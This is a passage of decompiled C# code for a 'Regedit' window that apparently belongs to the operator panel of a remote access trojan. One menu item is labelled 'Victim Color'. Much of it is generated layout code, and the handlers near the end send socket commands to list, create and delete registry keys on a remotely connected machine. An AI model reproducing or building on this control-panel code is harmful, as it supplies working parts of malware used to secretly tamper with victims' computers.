				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem_Click);
				bool flag = this._RefreshToolStripMenuItem != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem.Click -= value2;
				}
				this._RefreshToolStripMenuItem = value;
				flag = (this._RefreshToolStripMenuItem != null);
				if (flag)
				{
					this._RefreshToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem CreateKeyToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CreateKeyToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CreateKeyToolStripMenuItem_Click);
				bool flag = this._CreateKeyToolStripMenuItem != null;
				if (flag)
				{
					this._CreateKeyToolStripMenuItem.Click -= value2;
				}
				this._CreateKeyToolStripMenuItem = value;
				flag = (this._CreateKeyToolStripMenuItem != null);
				if (flag)
				{
					this._CreateKeyToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem DeleteKeyToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DeleteKeyToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteKeyToolStripMenuItem_Click);
				bool flag = this._DeleteKeyToolStripMenuItem != null;
				if (flag)
				{
					this._DeleteKeyToolStripMenuItem.Click -= value2;
				}
				this._DeleteKeyToolStripMenuItem = value;
				flag = (this._DeleteKeyToolStripMenuItem != null);
				if (flag)
				{
					this._DeleteKeyToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual StatusStrip StatusStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StatusStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StatusStrip1 = value;
			}
		}

		internal virtual ToolStripProgressBar pr
		{
			[DebuggerNonUserCode]
			get
			{
				return this._pr;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._pr = value;
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		internal virtual Panel Panel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel2 = value;
			}
		}

		internal virtual ListView RGLIST
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RGLIST;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RGLIST = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click);
				bool flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				flag = (this._ToolStripMenuItem1 != null);
				if (flag)
				{
					this._ToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem2_Click);
				bool flag = this._ToolStripMenuItem2 != null;
				if (flag)
				{
					this._ToolStripMenuItem2.Click -= value2;
				}
				this._ToolStripMenuItem2 = value;
				flag = (this._ToolStripMenuItem2 != null);
				if (flag)
				{
					this._ToolStripMenuItem2.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem3_Click);
				bool flag = this._ToolStripMenuItem3 != null;
				if (flag)
				{
					this._ToolStripMenuItem3.Click -= value2;
				}
				this._ToolStripMenuItem3 = value;
				flag = (this._ToolStripMenuItem3 != null);
				if (flag)
				{
					this._ToolStripMenuItem3.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem4_Click);
				bool flag = this._ToolStripMenuItem4 != null;
				if (flag)
				{
					this._ToolStripMenuItem4.Click -= value2;
				}
				this._ToolStripMenuItem4 = value;
				flag = (this._ToolStripMenuItem4 != null);
				if (flag)
				{
					this._ToolStripMenuItem4.Click += value2;
				}
			}
		}

		internal virtual NYX_GroupBox NyX_GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NyX_GroupBox1 = value;
			}
		}

		internal virtual ImageList l1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._l1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._l1 = value;
			}
		}

		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		internal virtual ToolStripMenuItem DetailsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DetailsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DetailsToolStripMenuItem_Click);
				bool flag = this._DetailsToolStripMenuItem != null;
				if (flag)
				{
					this._DetailsToolStripMenuItem.Click -= value2;
				}
				this._DetailsToolStripMenuItem = value;
				flag = (this._DetailsToolStripMenuItem != null);
				if (flag)
				{
					this._DetailsToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ListViewToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ListViewToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ListViewToolStripMenuItem_Click);
				bool flag = this._ListViewToolStripMenuItem != null;
				if (flag)
				{
					this._ListViewToolStripMenuItem.Click -= value2;
				}
				this._ListViewToolStripMenuItem = value;
				flag = (this._ListViewToolStripMenuItem != null);
				if (flag)
				{
					this._ListViewToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ColorLinesToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColorLinesToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ColorLinesToolStripMenuItem_Click);
				bool flag = this._ColorLinesToolStripMenuItem != null;
				if (flag)
				{
					this._ColorLinesToolStripMenuItem.Click -= value2;
				}
				this._ColorLinesToolStripMenuItem = value;
				flag = (this._ColorLinesToolStripMenuItem != null);
				if (flag)
				{
					this._ColorLinesToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem VictimColorToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._VictimColorToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.VictimColorToolStripMenuItem_Click);
				bool flag = this._VictimColorToolStripMenuItem != null;
				if (flag)
				{
					this._VictimColorToolStripMenuItem.Click -= value2;
				}
				this._VictimColorToolStripMenuItem = value;
				flag = (this._VictimColorToolStripMenuItem != null);
				if (flag)
				{
					this._VictimColorToolStripMenuItem.Click += value2;
				}
			}
		}

		[DebuggerNonUserCode]
		public Reg()
		{
			base.Load += new EventHandler(this.Reg_Load);
			Reg.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Reg.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Reg.__ENCList.Count == Reg.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Reg.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Reg.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Reg.__ENCList[num] = Reg.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Reg.__ENCList.RemoveRange(num, Reg.__ENCList.Count - num);
						Reg.__ENCList.Capacity = Reg.__ENCList.Count;
					}
					Reg.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			TreeNode treeNode = new TreeNode("HKEY_CLASSES_ROOT");
			TreeNode treeNode2 = new TreeNode("HKEY_CURRENT_USER");
			TreeNode treeNode3 = new TreeNode("HKEY_LOCAL_MACHINE");
			TreeNode treeNode4 = new TreeNode("HKEY_USERS");
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Reg));
			this.RGk = new TreeView();
			this.crgk = new ContextMenuStrip(this.components);
			this.RefreshToolStripMenuItem = new ToolStripMenuItem();
			this.CreateKeyToolStripMenuItem = new ToolStripMenuItem();
			this.DeleteKeyToolStripMenuItem = new ToolStripMenuItem();
			this.ImageList1 = new ImageList(this.components);
			this.StatusStrip1 = new StatusStrip();
			this.pr = new ToolStripProgressBar();
			this.Timer1 = new Timer(this.components);
			this.Panel1 = new Panel();
			this.NyX_GroupBox1 = new NYX_GroupBox();
			this.Panel2 = new Panel();
			this.RGLIST = new ListView();
			this.ColumnHeader1 = new ColumnHeader();
			this.ColumnHeader2 = new ColumnHeader();
			this.ColumnHeader3 = new ColumnHeader();
			this.ContextMenuStrip1 = new ContextMenuStrip(this.components);
			this.ToolStripMenuItem1 = new ToolStripMenuItem();
			this.ToolStripMenuItem2 = new ToolStripMenuItem();
			this.ToolStripMenuItem3 = new ToolStripMenuItem();
			this.ToolStripMenuItem4 = new ToolStripMenuItem();
			this.DetailsToolStripMenuItem = new ToolStripMenuItem();
			this.ListViewToolStripMenuItem = new ToolStripMenuItem();
			this.ColorLinesToolStripMenuItem = new ToolStripMenuItem();
			this.VictimColorToolStripMenuItem = new ToolStripMenuItem();
			this.l1 = new ImageList(this.components);
			this.crgk.SuspendLayout();
			this.StatusStrip1.SuspendLayout();
			this.Panel1.SuspendLayout();
			this.Panel2.SuspendLayout();
			this.ContextMenuStrip1.SuspendLayout();
			this.SuspendLayout();
			this.RGk.BackColor = Color.Black;
			this.RGk.ContextMenuStrip = this.crgk;
			this.RGk.Dock = DockStyle.Left;
			this.RGk.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.RGk.ForeColor = Color.LightSteelBlue;
			this.RGk.ImageIndex = 0;
			this.RGk.ImageList = this.ImageList1;
			Control arg_272_0 = this.RGk;
			Point location = new Point(0, 0);
			arg_272_0.Location = location;
			this.RGk.Name = "RGk";
			treeNode.ImageIndex = -2;
			treeNode.Name = "HKEY_CLASSES_ROOT";
			treeNode.Text = "HKEY_CLASSES_ROOT";
			treeNode2.ImageIndex = -2;
			treeNode2.Name = "HKEY_CURRENT_USER";
			treeNode2.Text = "HKEY_CURRENT_USER";
			treeNode3.ImageIndex = -2;
			treeNode3.Name = "HKEY_LOCAL_MACHINE";
			treeNode3.Text = "HKEY_LOCAL_MACHINE";
			treeNode4.ImageIndex = -2;
			treeNode4.Name = "HKEY_USERS";
			treeNode4.Text = "HKEY_USERS";
			this.RGk.Nodes.AddRange(new TreeNode[]
			{
				treeNode,
				treeNode2,
				treeNode3,
				treeNode4
			});
			this.RGk.SelectedImageIndex = 0;
			Control arg_36B_0 = this.RGk;
			Size size = new Size(195, 294);
			arg_36B_0.Size = size;
			this.RGk.TabIndex = 12;
			this.crgk.BackColor = Color.FromArgb(22, 22, 22);
			this.crgk.Items.AddRange(new ToolStripItem[]
			{
				this.RefreshToolStripMenuItem,
				this.CreateKeyToolStripMenuItem,
				this.DeleteKeyToolStripMenuItem
			});
			this.crgk.Name = "crgk";
			Control arg_3FA_0 = this.crgk;
			size = new Size(128, 70);
			arg_3FA_0.Size = size;
			this.RefreshToolStripMenuItem.BackColor = Color.FromArgb(22, 22, 22);
			this.RefreshToolStripMenuItem.ForeColor = Color.White;
			this.RefreshToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RefreshToolStripMenuItem.Image");
			this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
			ToolStripItem arg_469_0 = this.RefreshToolStripMenuItem;
			size = new Size(127, 22);
			arg_469_0.Size = size;
			this.RefreshToolStripMenuItem.Text = "Refresh";
			this.CreateKeyToolStripMenuItem.BackColor = Color.FromArgb(22, 22, 22);
			this.CreateKeyToolStripMenuItem.ForeColor = Color.White;
			this.CreateKeyToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("CreateKeyToolStripMenuItem.Image");
			this.CreateKeyToolStripMenuItem.Name = "CreateKeyToolStripMenuItem";
			ToolStripItem arg_4E9_0 = this.CreateKeyToolStripMenuItem;
			size = new Size(127, 22);
			arg_4E9_0.Size = size;
			this.CreateKeyToolStripMenuItem.Text = "CreateKey";
			this.DeleteKeyToolStripMenuItem.BackColor = Color.FromArgb(22, 22, 22);
			this.DeleteKeyToolStripMenuItem.ForeColor = Color.White;
			this.DeleteKeyToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("DeleteKeyToolStripMenuItem.Image");
			this.DeleteKeyToolStripMenuItem.Name = "DeleteKeyToolStripMenuItem";
			ToolStripItem arg_569_0 = this.DeleteKeyToolStripMenuItem;
			size = new Size(127, 22);
			arg_569_0.Size = size;
			this.DeleteKeyToolStripMenuItem.Text = "DeleteKey";
			this.ImageList1.ImageStream = (ImageListStreamer)componentResourceManager.GetObject("ImageList1.ImageStream");
			this.ImageList1.TransparentColor = Color.Transparent;
			this.ImageList1.Images.SetKeyName(0, "R_1.png");
			this.StatusStrip1.BackColor = Color.Black;
			this.StatusStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.pr
			});
			Control arg_611_0 = this.StatusStrip1;
			location = new Point(0, 294);
			arg_611_0.Location = location;
			this.StatusStrip1.Name = "StatusStrip1";
			Control arg_63F_0 = this.StatusStrip1;
			size = new Size(678, 22);
			arg_63F_0.Size = size;
			this.StatusStrip1.TabIndex = 11;
			this.StatusStrip1.Text = "StatusStrip1";
			this.pr.Name = "pr";
			ToolStripControlHost arg_68C_0 = this.pr;
			size = new Size(212, 16);
			arg_68C_0.Size = size;
			this.Panel1.BackColor = Color.Black;
			this.Panel1.Controls.Add(this.NyX_GroupBox1);
			this.Panel1.Dock = DockStyle.Top;
			Control arg_6DD_0 = this.Panel1;
			location = new Point(195, 0);
			arg_6DD_0.Location = location;
			this.Panel1.Name = "Panel1";
			Control arg_70B_0 = this.Panel1;
			size = new Size(483, 27);
			arg_70B_0.Size = size;
			this.Panel1.TabIndex = 14;
			this.NyX_GroupBox1.Animated = true;
			this.NyX_GroupBox1.BorderStyle = FormBorderStyle.None;
			this.NyX_GroupBox1.Colors = new Bloom[0];
			this.NyX_GroupBox1.Customization = "";
			this.NyX_GroupBox1.Font = new Font("Arial", 9f);
			this.NyX_GroupBox1.Image = null;
			Control arg_796_0 = this.NyX_GroupBox1;
			location = new Point(0, 0);
			arg_796_0.Location = location;
			this.NyX_GroupBox1.Movable = true;
			this.NyX_GroupBox1.Name = "NyX_GroupBox1";
			this.NyX_GroupBox1.NoRounding = false;
			this.NyX_GroupBox1.Sizable = true;
			Control arg_7EB_0 = this.NyX_GroupBox1;
			size = new Size(1677, 27);
			arg_7EB_0.Size = size;
			this.NyX_GroupBox1.SmartBounds = true;
			this.NyX_GroupBox1.StartPosition = FormStartPosition.Manual;
			this.NyX_GroupBox1.TabIndex = 24;
			this.NyX_GroupBox1.Text = ".";
			this.NyX_GroupBox1.TransparencyKey = Color.Empty;
			this.NyX_GroupBox1.Transparent = false;
			this.Panel2.Controls.Add(this.RGLIST);
			this.Panel2.Dock = DockStyle.Fill;
			Control arg_883_0 = this.Panel2;
			location = new Point(195, 27);
			arg_883_0.Location = location;
			this.Panel2.Name = "Panel2";
			Control arg_8B4_0 = this.Panel2;
			size = new Size(483, 267);
			arg_8B4_0.Size = size;
			this.Panel2.TabIndex = 15;
			this.RGLIST.BackColor = Color.Black;
			this.RGLIST.Columns.AddRange(new ColumnHeader[]
			{
				this.ColumnHeader1,
				this.ColumnHeader2,
				this.ColumnHeader3
			});
			this.RGLIST.ContextMenuStrip = this.ContextMenuStrip1;
			this.RGLIST.Dock = DockStyle.Fill;
			this.RGLIST.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.RGLIST.ForeColor = Color.LightSteelBlue;
			this.RGLIST.LargeImageList = this.l1;
			Control arg_987_0 = this.RGLIST;
			location = new Point(0, 0);
			arg_987_0.Location = location;
			this.RGLIST.Name = "RGLIST";
			Control arg_9B8_0 = this.RGLIST;
			size = new Size(483, 267);
			arg_9B8_0.Size = size;
			this.RGLIST.SmallImageList = this.l1;
			this.RGLIST.TabIndex = 14;
			this.RGLIST.UseCompatibleStateImageBehavior = false;
			this.RGLIST.View = View.Details;
			this.ColumnHeader1.Text = "Name";
			this.ColumnHeader1.Width = 127;
			this.ColumnHeader2.Text = "Type";
			this.ColumnHeader2.Width = 148;
			this.ColumnHeader3.Text = "Value";
			this.ColumnHeader3.Width = 144;
			this.ContextMenuStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.ToolStripMenuItem1,
				this.ToolStripMenuItem2,
				this.ToolStripMenuItem3,
				this.ToolStripMenuItem4,
				this.DetailsToolStripMenuItem,
				this.ListViewToolStripMenuItem,
				this.ColorLinesToolStripMenuItem,
				this.VictimColorToolStripMenuItem
			});
			this.ContextMenuStrip1.Name = "crg";
			Control arg_AF9_0 = this.ContextMenuStrip1;
			size = new Size(141, 180);
			arg_AF9_0.Size = size;
			this.ToolStripMenuItem1.BackColor = Color.Black;
			this.ToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem1.Image");
			this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
			ToolStripItem arg_B65_0 = this.ToolStripMenuItem1;
			size = new Size(140, 22);
			arg_B65_0.Size = size;
			this.ToolStripMenuItem1.Text = "Refresh";
			this.ToolStripMenuItem2.BackColor = Color.Black;
			this.ToolStripMenuItem2.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem2.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem2.Image");
			this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
			ToolStripItem arg_BE2_0 = this.ToolStripMenuItem2;
			size = new Size(140, 22);
			arg_BE2_0.Size = size;
			this.ToolStripMenuItem2.Text = "Edit";
			this.ToolStripMenuItem3.BackColor = Color.Black;
			this.ToolStripMenuItem3.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem3.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem3.Image");
			this.ToolStripMenuItem3.Name = "ToolStripMenuItem3";
			ToolStripItem arg_C5F_0 = this.ToolStripMenuItem3;
			size = new Size(140, 22);
			arg_C5F_0.Size = size;
			this.ToolStripMenuItem3.Text = "NewValue";
			this.ToolStripMenuItem4.BackColor = Color.Black;
			this.ToolStripMenuItem4.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem4.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem4.Image");
			this.ToolStripMenuItem4.Name = "ToolStripMenuItem4";
			ToolStripItem arg_CDC_0 = this.ToolStripMenuItem4;
			size = new Size(140, 22);
			arg_CDC_0.Size = size;
			this.ToolStripMenuItem4.Text = "Delete";
			this.DetailsToolStripMenuItem.BackColor = Color.Black;
			this.DetailsToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.DetailsToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("DetailsToolStripMenuItem.Image");
			this.DetailsToolStripMenuItem.Name = "DetailsToolStripMenuItem";
			ToolStripItem arg_D59_0 = this.DetailsToolStripMenuItem;
			size = new Size(140, 22);
			arg_D59_0.Size = size;
			this.DetailsToolStripMenuItem.Text = "Details";
			this.ListViewToolStripMenuItem.BackColor = Color.Black;
			this.ListViewToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.ListViewToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ListViewToolStripMenuItem.Image");
			this.ListViewToolStripMenuItem.Name = "ListViewToolStripMenuItem";
			ToolStripItem arg_DD6_0 = this.ListViewToolStripMenuItem;
			size = new Size(140, 22);
			arg_DD6_0.Size = size;
			this.ListViewToolStripMenuItem.Text = "ListView";
			this.ColorLinesToolStripMenuItem.BackColor = Color.Black;
			this.ColorLinesToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.ColorLinesToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ColorLinesToolStripMenuItem.Image");
			this.ColorLinesToolStripMenuItem.Name = "ColorLinesToolStripMenuItem";
			ToolStripItem arg_E53_0 = this.ColorLinesToolStripMenuItem;
			size = new Size(140, 22);
			arg_E53_0.Size = size;
			this.ColorLinesToolStripMenuItem.Text = "Color Lines";
			this.VictimColorToolStripMenuItem.BackColor = Color.Black;
			this.VictimColorToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.VictimColorToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("VictimColorToolStripMenuItem.Image");
			this.VictimColorToolStripMenuItem.Name = "VictimColorToolStripMenuItem";
			ToolStripItem arg_ED0_0 = this.VictimColorToolStripMenuItem;
			size = new Size(140, 22);
			arg_ED0_0.Size = size;
			this.VictimColorToolStripMenuItem.Text = "Victim Color";
			this.l1.ImageStream = (ImageListStreamer)componentResourceManager.GetObject("l1.ImageStream");
			this.l1.TransparentColor = Color.Transparent;
			this.l1.Images.SetKeyName(0, "R_1.png");
			this.l1.Images.SetKeyName(1, "R_3.png");
			this.l1.Images.SetKeyName(2, "R_2.png");
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			size = new Size(678, 316);
			this.ClientSize = size;
			this.Controls.Add(this.Panel2);
			this.Controls.Add(this.Panel1);
			this.Controls.Add(this.RGk);
			this.Controls.Add(this.StatusStrip1);
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "Reg";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Regedit";
			this.crgk.ResumeLayout(false);
			this.StatusStrip1.ResumeLayout(false);
			this.StatusStrip1.PerformLayout();
			this.Panel1.ResumeLayout(false);
			this.Panel2.ResumeLayout(false);
			this.ContextMenuStrip1.ResumeLayout(false);
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		private void CreateKeyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null && this.RGk.SelectedNode.FullPath.Contains("\\");
			if (flag)
			{
				string text = Interaction.InputBox("Key Name?", "Create New Key", "Name", -1, -1);
				flag = (text.Length != 0);
				if (flag)
				{
					this.sk.Send(string.Concat(new string[]
					{
						"RG",
						sokserver.Y,
						"#",
						sokserver.Y,
						this.RGk.SelectedNode.FullPath,
						"\\",
						sokserver.Y,
						text
					}));
				}
			}
		}

		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"RG",
					sokserver.Y,
					"~",
					sokserver.Y,
					this.RGk.SelectedNode.FullPath,
					"\\"
				}));
				this.RGLIST.Enabled = false;
				this.RGk.Enabled = false;
			}
		}

		private void DeleteKeyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			checked
			{
				if (flag)
				{
					string fullPath = this.RGk.SelectedNode.FullPath;
					flag = fullPath.Contains("\\");
					if (flag)
					{
						string text = Strings.Split(fullPath, "\\", -1, CompareMethod.Binary)[Strings.Split(fullPath, "\\", -1, CompareMethod.Binary).Length - 1];
						string text2 = "";
						int num = Strings.Split(fullPath, "\\", -1, CompareMethod.Binary).Length - 2;
						for (int i = 0; i <= num; i++)
						{
							text2 = text2 + Strings.Split(fullPath, "\\", -1, CompareMethod.Binary)[i] + "\\";
						}
						this.sk.Send(string.Concat(new string[]
						{
							"RG",
							sokserver.Y,
							"$",
							sokserver.Y,
							text2,
							sokserver.Y,
							text
						}));
						this.RGk.SelectedNode.Remove();
					}
				}
			}
		}

		private void RefreshToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		private void EditToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void NewValueToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void RGk_Click(object sender, EventArgs e)
		{
		}

		private void RGk_DoubleClick(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"RG",
					sokserver.Y,
					"~",
					sokserver.Y,
					this.RGk.SelectedNode.FullPath,
					"\\"
				}));
				this.RGLIST.Enabled = false;
				this.RGk.Enabled = false;
			}
		}

		private void RGLIST_DoubleClick(object sender, EventArgs e)
		{
			bool flag = this.RGLIST.SelectedItems.Count != 0;
			if (flag)
			{
				ListViewItem listViewItem = this.RGLIST.SelectedItems[0];
				Frm_registry frm_registry = new Frm_registry();
				frm_registry.Path = this.RGk.SelectedNode.FullPath + "\\";
				frm_registry.sk = this.sk;
				frm_registry.TextBox1.Text = listViewItem.Text;
				frm_registry.ComboBox1.SelectedIndex = frm_registry.ComboBox1.Items.IndexOf(listViewItem.SubItems[1].Text);
				try
				{
					frm_registry.TextBox3.Text = listViewItem.SubItems[2].Text;
				}
				catch (Exception expr_C3)
				{
					ProjectData.SetProjectError(expr_C3);
					Exception projectError = expr_C3;
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				frm_registry.Text = frm_registry.Path;
				frm_registry.TextBox1.ReadOnly = true;
				frm_registry.ShowDialog(this);
			}
		}

		private void RGk_AfterSelect(object sender, TreeViewEventArgs e)
		{
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = !this.sk.CN;
			if (flag)
			{
				this.Close();
			}
		}

		private void Reg_Load(object sender, EventArgs e)
		{
		}

		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"RG",
					sokserver.Y,
					"~",
					sokserver.Y,
					this.RGk.SelectedNode.FullPath,
					"\\"
				}));
				this.RGLIST.Enabled = false;
